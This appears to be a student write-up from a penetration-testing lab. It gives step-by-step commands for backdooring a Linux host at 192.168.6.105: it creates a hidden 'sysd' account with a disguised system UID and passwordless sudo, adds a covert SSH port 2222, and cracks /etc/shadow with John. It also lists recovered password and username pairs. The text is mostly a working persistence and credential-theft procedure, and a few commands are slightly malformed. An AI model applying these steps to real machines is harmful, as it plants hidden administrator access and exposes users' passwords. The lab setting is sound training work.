Step 1: Shadow People
1. Create a secret user named sysd. Make sure this user doesn't have a home folder created:
   * adduser --no-create-home sysd
2. Give your secret user a password:
   * passwd sysd
3. Give your secret user a system UID < 1000:
   * usermod -u 155 sysd
4. Give your secret user the same GID:
   * groupmod -g 155 sysd
5. Give your secret user full sudo access without the need for a password:
   * usermod -aG sudo sysd
6. Test that sudo access works without your password:
sudo -l
sudo visudo (should say sysd ALL=(ALL)NOPASSWD:ALL)
cat etc/shadow/
Step 2: Smooth Sailing
   1. Edit the sshd_config file:
nano /etc/ssh/sshd_config 
Once in nano uncomment line PORT 22 and add PORT 2222 below (see below)
# default value. 
Port 22 
Port 2222 
#AddressFamily any 
#ListenAddress 0.0.0.0
 #ListenAddress :: 
Step 3: Testing Your Configuration Update
      1. Restart the SSH service:
      * sudo systemctl restart ssh.service
      2. Exit the root account:
      * exit
      3. SSH to the target machine using your sysd account and port 2222:
      * ssh sysd@192.168.6.105 -p 2222
      4. Use sudo to switch to the root user:
      * sudo su
Step 4: Crack All the Passwords
      1. SSH back to the system using your sysd account and port 2222:
      * ssh sysd@192.168.6.105 -p 2222
      2. Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:
      * computer:stallman 
      * freedom:babbage 
      * trustno1:mitnik 
      * dragon:lovelace  
      * lakers:turing  
      * Goodluck!:student
      * password:sysd
